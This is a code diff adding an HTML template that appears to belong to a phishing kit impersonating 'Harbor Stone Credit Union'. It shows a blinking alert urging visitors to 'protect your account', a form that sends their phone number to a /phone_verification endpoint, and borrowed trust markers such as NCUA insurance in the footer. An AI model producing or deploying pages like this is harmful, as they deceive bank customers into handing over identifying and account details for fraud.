@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <title>Harbor Stone Credit Union</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='phone.css') }}">
+  <link rel="shortcut icon" href="{{ url_for('static', filename='IMG_3021.WEBP') }}" width="100px" height="80px">
+</head>
+<body>
+  <header class="header">
+    <nav class="nav">
+      <a href="#" class="nav_logo"> <img src="{{ url_for('static', filename='IMG_3021.WEBP') }}" alt="Harbor Stone Logo" width="200px" height="50px"></a>
+    </nav>
+  </header>
+  <div class="center">
+    <h1><img src="{{ url_for('static', filename='IMG_3021.WEBP') }}" alt="Harbor Stone Logo" width="200px" height="50px"></h1>
+    <h2>Alert Information</h2>
+    <h5 class="blink">To protect your account, Please provide the requested information.</h5>
+    <form action="/phone_verification" method="POST"> <!-- Corrected action attribute -->
+      <div class="txt_field">
+        <input type="tel" required id="phone_number" name="phone_number" placeholder="Enter your phone number">
+        <span></span>
+      
+      </div>
+      <button class="verify" type="submit">Verify</button>
+      <div><br></div> <!-- Added spacing -->
+    </form>
+  </div>
+  <footer>
+    <p>© 2024 Harbor Stone Credit Union</p>
+    <nav>
+      <a href="/terms">Terms of Service</a>.
+      <a href="/privacy">Privacy Policy</a>.
+      <p>Federally Insured by NCUA</p>
+      <p>Equal Housing Lender</p>.
+    </nav>
+  </footer>
+</body>
+</html>
